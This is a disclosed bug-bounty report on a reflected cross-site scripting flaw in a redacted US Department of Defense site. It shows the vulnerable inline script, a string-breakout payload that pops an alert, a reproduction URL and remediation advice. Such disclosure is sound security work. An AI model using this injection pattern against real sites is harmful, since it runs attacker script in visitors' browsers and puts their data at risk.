# Reflected XSS on █████████

## Report Details
- **Report ID**: 1059395
- **URL**: https://hackerone.com/reports/1059395
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-12-15T12:48:35.722Z
- **Disclosed**: 2021-04-02T18:50:29.579Z

## Reporter
- **Username**: phibz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
## Summary 
Reflected XSS on `█████`.

## Description
The page `█████` has a reflected parameter `██████████`. The parameter is used in a javascript function. For example for requesting `http://█████████/?█████████=chron0x` the javascript is as follows:
```javascript
[...]
<script>
	//alert('boo');
    function clickit(){
        var █████████ = 'chron0x';
        if (██████████!==''){
            //alert(████████);
            $('#'+████████).click();
            //alert(████);
	    }
    }
</script>
[...]
```
Due to improper input sanitization, this is vulnerable to XSS. The payload `?█████=';}alert("chron0x"); function clickit(){//`


```javascript
[...]
<script>
	//alert('boo');
    function clickit(){
        var ████ = '';
    }
    alert("chron0x"); 
    function clickit(){//';
        if (██████████!==''){
            //alert(██████████);
            $('#'+██████████).click();
            //alert(████████);
	    }
    }
</script>
[...]
```

pops an alert box, demonstrating XSS.

Note: I am reporting this here, since the footer of `████` states `Official United States ███████ Website. The ████████ █████.`, and the United States ██████████ underlies the DoD. If this should not belong to the DoD scope I would kindly ask to self close this issue.

## Step-by-step Reproduction Instructions

1. Visit `http://█████/?██████=%27;}alert(%22chron0x%22);%20function%20clickit(){//`

An alert box with `chron0x` pops.

## Mitigation/Remediation Actions
Sanitize the input for the ███████ parameter, such that certain characters are encoded or not allowed.

## Impact

Data can be stolen, or Javascript can be executed.

## Attachments
No attachments
